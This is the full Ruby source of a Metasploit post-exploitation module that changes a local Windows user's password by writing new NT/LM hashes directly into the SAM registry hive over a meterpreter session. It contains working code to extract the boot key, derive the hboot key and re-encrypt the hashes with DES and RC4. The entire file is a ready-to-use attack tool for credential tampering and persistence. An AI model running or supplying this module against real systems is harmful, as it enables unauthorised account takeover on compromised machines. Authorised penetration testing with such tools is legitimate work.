##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
    include Msf::Auxiliary::Report
    include Msf::Post::Windows::Priv
    include Msf::Post::Windows::Registry

    def initialize(info={})
        super( update_info( info,
            'Name'          => 'Windows Local User Account Hash Carver',
            'Description'   => %q{ This module will change a local user's password directly in the registry. },
            'License'       => MSF_LICENSE,
            'Author'        => [ 'p3nt4' ],
            'Platform'      => [ 'win' ],
            'SessionTypes'  => [ 'meterpreter' ]
        ))
        register_options(
            [
                OptString.new('user', [true, 'Username to change password of', nil]),
                OptString.new('pass', [true, 'Password, NTHash or LM:NT hashes value to set as the user\'s password', nil])
            ])
        # Constants for SAM decryption
        @sam_lmpass   = "LMPASSWORD\x00"
        @sam_ntpass   = "NTPASSWORD\x00"
        @sam_qwerty   = "!@\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
        @sam_numeric  = "0123456789012345678901234567890123456789\x00"
        @sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
        @sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")
    end

    def run
        begin
            #Variable Setup
            username=datastore['user']
            pass=datastore['pass']
            #Detecting password style
            if pass.length==32
                print_status("Password detected as NT hash")
                nthash = pass
                lmhash="aad3b435b51404eeaad3b435b51404ee"
            elsif pass.length==65
                print_status("Password detected as LN:NT hashes")
                nthash = pass.split(':')[1]
                lmhash = pass.split(':')[0]
            else
                print_status("Password detected as clear text, generating hashes:")
                nthash=hash_nt(pass)
                lmhash=hash_lm(pass)
            end
            print_line("LM Hash: "+lmhash)
            print_line("NT Hash: "+nthash)
            print_status("Searching for user")
            ridInt    = get_user_id(username)
            rid = '%08x' % ridInt
            print_line("User found with id: " + rid)
            print_status("Loading user key")
            user    = get_user_key(rid)
            print_status("Obtaining the boot key...")
            bootkey  = capture_boot_key
            print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
            hbootkey = capture_hboot_key(bootkey)
            print_status("Modifying user key")
            modify_user_key(hbootkey, ridInt, user,[nthash].pack("H*"),[lmhash].pack("H*"))
            print_status("Carving user key")
            write_user_key(rid, user)
            print_status("Completed! Let's hope for the best")
            rescue ::Interrupt
            raise $!
            rescue ::Exception => e
                print_error("Error: #{e}")
        end
    end

    def capture_hboot_key(bootkey)
        ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", KEY_READ)
        return if not ok
        vf = ok.query_value("F")
        return if not vf
        vf = vf.data
        ok.close
        hash = Digest::MD5.new
        hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
        rc4 = OpenSSL::Cipher.new("rc4")
        rc4.key = hash.digest
        hbootkey  = rc4.update(vf[0x80, 32])
        hbootkey << rc4.final
        return hbootkey
    end

    def get_user_id(username)
        ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
        ok.enum_key.each do |usr|
            uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
            r = uk.query_value("")
            rid = r.type
            if usr.downcase == username.downcase
                return rid
            end
            uk.close
        end
        ok.close
        raise 'The user does not exist'
    end

    def get_user_key(rid)
        uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{rid}", KEY_READ)
        user = uk.query_value("V").data
        uk.close
        return user
    end

    def write_user_key(rid,user)
        uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{rid}", KEY_WRITE)
        uk.set_value("V",REG_BINARY,user)
        uk.close
    end

    def modify_user_key(hbootkey, rid, user, nthash, lmhash)
        hoff = user[0x9c, 4].unpack("V")[0] + 0xcc
        #Check if hashes exist (if 20, then we've got a hash)
        lm_exists = user[0x9c+4,4].unpack("V")[0] == 20 ? true : false
        nt_exists = user[0x9c+16,4].unpack("V")[0] == 20 ? true : false
        if !lm_exists and !nt_exists
            raise 'No password is currently set for the user'
        end
        print_status("Modifiying LM hash")
        if lm_exists
            user[hoff + 4, 16] = encrypt_user_hash(rid, hbootkey, lmhash, @sam_lmpass)
        else
            print_error("LM hash does not exist, skipping")
        end
        print_status("Modifiying NT hash")
        if nt_exists
            user[(hoff + (lm_exists ? 24 : 8)), 16] = encrypt_user_hash(rid, hbootkey, nthash, @sam_ntpass)
        else
            print_error("NT hash does not exist, skipping")
        end
    end

    def rid_to_key(rid)
        s1 = [rid].pack("V")
        s1 << s1[0,3]
        s2b = [rid].pack("V").unpack("C4")
        s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack("C4")
        s2 << s2[0,3]
        [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
    end

    def encode_utf16(str)
        str.to_s.encode(Encoding::UTF_16LE).force_encoding(Encoding::ASCII_8BIT)
    end

    def encrypt_user_hash(rid, hbootkey, hash, pass)
        if(hash.empty?)
            case pass
                when @sam_lmpass
                return @sam_empty_lm
                when @sam_ntpass
                return @sam_empty_nt
            end
            return ""
        end

        des_k1, des_k2 = rid_to_key(rid)
        d1 = OpenSSL::Cipher.new('des-ecb')
        d1.padding = 0
        d1.key = des_k1
        d2 = OpenSSL::Cipher.new('des-ecb')
        d2.padding = 0
        d2.key = des_k2
        md5 = Digest::MD5.new
        md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
        rc4 = OpenSSL::Cipher.new('rc4')
        rc4.key = md5.digest
        rc4.encrypt
        d2o  = d2.encrypt.update(hash[8,8])
        d1o  = d1.encrypt.update(hash[0,8])
        enchash = rc4.update(d1o+d2o)
        return enchash
    end

    def hash_nt(pass)
        return OpenSSL::Digest::MD4.digest(encode_utf16(pass)).unpack("H*")[0]
    end

    def hash_lm(key)
      lm_magic = 'KGS!@\#$%'
      key = key.ljust(14, "\0")
      keys = create_des_keys(key[0, 14])
      result = ''
      cipher = OpenSSL::Cipher::DES.new
      keys.each do |k|
        cipher.encrypt
        cipher.key = k
        result << cipher.update(lm_magic)
      end
      return result.unpack("H*")[0]
    end

    def create_des_keys(string)
        keys = []
        string = string.dup
        until (key = string.slice!(0, 7)).empty?
            # key is 56 bits
            key = key.unpack('B*').first
            str = ''
            until (bits = key.slice!(0, 7)).empty?
                str << bits
                str << (bits.count('1').even? ? '1' : '0')  # parity
            end
            keys << [str].pack('B*')
        end
        keys
    end
end
